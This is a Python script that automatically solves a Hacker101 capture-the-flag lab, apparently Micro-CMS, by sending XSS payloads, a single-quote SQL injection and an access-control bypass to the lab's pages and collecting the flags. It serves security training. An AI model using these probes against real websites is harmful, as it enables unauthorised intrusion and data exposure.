# Importing Packages #
from requests import get as get_request, post as post_request
from re import search as search_flag
# Getting CTF URL #
ctf_url = f"https://{input("\033[32m[1] Enter your ctf id: \033[0m")}.ctf.hacker101.com"
# Declaring Flags list #
FLAGS = []
# Handling Exceptions #
try:
    # Checking for correct ctf id #
    if get_request(ctf_url).status_code == 200:
        # Printing Message before featching all flags #
        print("\033[33m[2] Please wait while we featch all flags.\033[0m")
        # Finding first flag by creating a new post and injecting Reflected XSS payload #
        FLAGS.append(f'^FLAG^{search_flag(r"\^FLAG\^(.*?)\$FLAG\$", post_request(f'{ctf_url}/page/create', data={'title': 'Skillshetra','body': 'Skillshetra <button onclick=alert(‘xss’)>click</button> <script>alert(1);</script>'}, headers = {'Host': '2b7e20b4c0760b4790b296995f223d2e.ctf.hacker101.com', 'Content-Type': 'application/x-www-form-urlencoded'}).text).group(1) if search_flag(r"\^FLAG\^(.*?)\$FLAG\$", post_request(f'{ctf_url}/page/create', data={'title': 'Skillshetra','body': 'Skillshetra <button onclick=alert(‘xss’)>click</button> <script>alert(1);</script>'}, headers = {'Host': '2b7e20b4c0760b4790b296995f223d2e.ctf.hacker101.com', 'Content-Type': 'application/x-www-form-urlencoded'}).text) else None}$FLAG$')
        # Getting The next flag by Stored XSS Vulnerability in homepage #
        FLAGS.append(f'^FLAG^{search_flag(r"\^FLAG\^(.*?)\$FLAG\$", get_request(ctf_url).text).group(1) if search_flag(r"\^FLAG\^(.*?)\$FLAG\$", get_request(ctf_url).text) else None}$FLAG$')
        # Getting Flag from SQL Injection Vulnerability #
        FLAGS.append(get_request(f"{ctf_url}/page/edit/1'").text)
        # Looking for forbidden page #
        for i in range(1, 10):
            # If forbidden page found  #
            if get_request(f'{ctf_url}/page/{i}').status_code == 403:
                # Append flag by going to edit page of same post Access Control Vulnerability #
                FLAGS.append(f'^FLAG^{search_flag(r"\^FLAG\^(.*?)\$FLAG\$", get_request(f'{ctf_url}/page/edit/{i}').text).group(1) if search_flag(r"\^FLAG\^(.*?)\$FLAG\$", get_request(f'{ctf_url}/page/edit/{i}').text) else None}$FLAG$')
                break
    else:
        print("\033[33m[2] Wrong ctf id check and try again.\033[0m")
except Exception as e:
    # Printing Exception #
    print(f"\033[31m[3] {str(e)}\033[0m")
# Printing all the flags #
print(f"\033[32m[3] Your flags are: {FLAGS}\033[0m")